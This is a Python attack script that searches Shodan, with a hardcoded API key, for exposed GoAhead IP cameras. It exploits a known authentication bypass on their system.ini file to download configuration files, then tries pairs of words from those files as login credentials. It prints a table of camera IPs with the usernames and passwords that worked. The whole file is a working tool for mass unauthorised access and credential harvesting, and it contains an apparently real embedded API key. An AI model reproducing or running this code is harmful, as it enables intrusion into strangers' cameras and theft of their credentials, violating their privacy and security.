import shodan, os, urllib.request
from requests import get
from requests import session
from colorama import init, Fore, Back
from progress.bar import IncrementalBar

from collections import Counter
from prettytable import PrettyTable

os.system('clear || cls')

try:
 mess = urllib.request.urlopen('https://raw.githubusercontent.com/Max412/cam/main/user.txt').read().decode('utf8')
except urllib.error.URLError:
 input("Check your internet connection!")
 exit()
except:
 input("Something went wrong!")
 exit()

# if os.getlogin() in mess:
#   pass
# else:
#   print("This user is not registered.\n")
#   inputi"Press Enter to exit.")
#   exit()

init(autoreset=True)

# if os.path.exists(r'C:\Windows\Temp\te.config') == False:
#  inn = input("Введите ключ API: ")
#  if inn == '':
#   exit()
#  file = open(r'C:\Windows\Temp\te.config', 'w')
#  file.write(inn)
#  file.close()
# else:
#   #print('ok')
#   pass

# key = open(r'C:\Windows\Temp\te.config', 'r').read()
key = '9r6vVczYqYGR9F3WADASttMPt6fqK2Mm' #9r6vVczYqYGR9F3WADASttMPt6fqK2Mm

api = shodan.Shodan(key)

num_of_vulnerable = []
locations = []
ips = []#'220.126.32.138']

def st():

 try:
  results = api.search('realm="GoAhead", domain=":81"')
 except shodan.exception.APIError:
  #os.remove(r'C:\Windows\Temp\te.config')
  input('Wrong API key!\nRestart the program and enter the correct API.')
  exit()

 #ips.clear()
 for result in results['matches']:
  ips.append(format(result['ip_str']))
  # with open('assad.txt', 'a+') as e:
  #   e.write(format(result['ip_str'])+'\n')
  ka = result['location']
  locations.append(f"{format(ka['city'])}, {format(ka['country_name'])}")

 for ip in list(set(ips)):
  try:

   print(f"Trying {Fore.CYAN + ip}")
   r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)

   with open(f'camera_{ip}.ini', 'wb') as f:
    f.write(r.content)

   if os.stat(f'camera_{ip}.ini').st_size >= int('10000') or os.stat(f'camera_{ip}.ini').st_size == int('178') or os.stat(f'camera_{ip}.ini').st_size == int('171') or os.stat(f'camera_{ip}.ini').st_size == int('542') or os.stat(f'camera_{ip}.ini').st_size == int('188'):
    os.remove(f'camera_{ip}.ini')
    #ips.remove(ip)
    #print(ips)
    print(Fore.LIGHTRED_EX + 'Denied\n')
    #input()
   else:
    num_of_vulnerable.append(ip)
    print(Fore.LIGHTGREEN_EX + 'Accessed\n')
  except:
    print(f'{ip} not available.\n')
    continue
st()

if len(num_of_vulnerable) >= int('1'):
  taro2 = Fore.LIGHTGREEN_EX + str(len(num_of_vulnerable))
else:
  taro2 = Fore.LIGHTRED_EX + str(len(num_of_vulnerable))

print(f'Devices tested: {len(list(set(ips)))}\nVulnerable devices: {taro2}\n')





th = ['IP', 'PORT', 'USERNAME', 'PASSWORD']
td = []






if len(num_of_vulnerable) >= int('1'):
 s = session()


 raz = 0
 with IncrementalBar('Processing', max=len(num_of_vulnerable)) as bar:
  #username = None
  #password = None
  #print(f'Username: {username}, password: {password}')
  #asq = []

  for ipi in num_of_vulnerable:
   try:
    user = None
    password = None
    file = open(f'camera_{ipi}.ini', 'r', encoding='latin-1')

    try:
     data = file.read().replace('\x00', ' ')
     words = data.split()
    except Exception as r:
     print(r)
     input('line 188')
    for i in range(len(words)-1):
     try:
      page = s.get(url=f'http://{ipi}:81', auth=(words[i], words[i+1]), timeout=10)
      #print(f"Trying for {ipi}\nUsername: {words[i]}, pass: {words[i+1]}", end='')
      #username = words[i]
      #password = words[i+1]
      if page.status_code == 200:
       #print(f'\nSuccess: {ipi} | {words[i]}:{words[i+1]}')
       #asq.append(f'IP: {Fore.CYAN + ipi + Fore.WHITE}\nUsername: {words[i]}\nPassword:{words[i+1]}\n')
       td.append(ipi)
       td.append('81')
       td.append(words[i])
       td.append(words[i+1])
       #asq.append(f'IP: {Fore.CYAN + ipi + Fore.WHITE}\nUsername: {words[i]}\nPassword:{words[i+1]}\n')
       raz += 1
       #print(asq)
       bar.next()
       break
      #raz += 1
      #tree.insert('', tk.END, values=(ipi, user, password))
     except Exception as e:
      #print('Error: ', e)
      continue
   except:
    continue
 print('')

# for d in asq:
#  print(d)
#  input("\nClick Enter to exit.")
# else:
#  input("No vulnerable devices was found!\nClick Enter to exit.")
#input()

if len(num_of_vulnerable) >= int('1'):
 columns = len(th)

 table = PrettyTable(th)

 td_data = td[:]
 while td_data:
    table.add_row(td_data[:columns])
    td_data = td_data[columns:]
 print(table, '\n')
else:
 print("No vulnerable devices was found!"\n)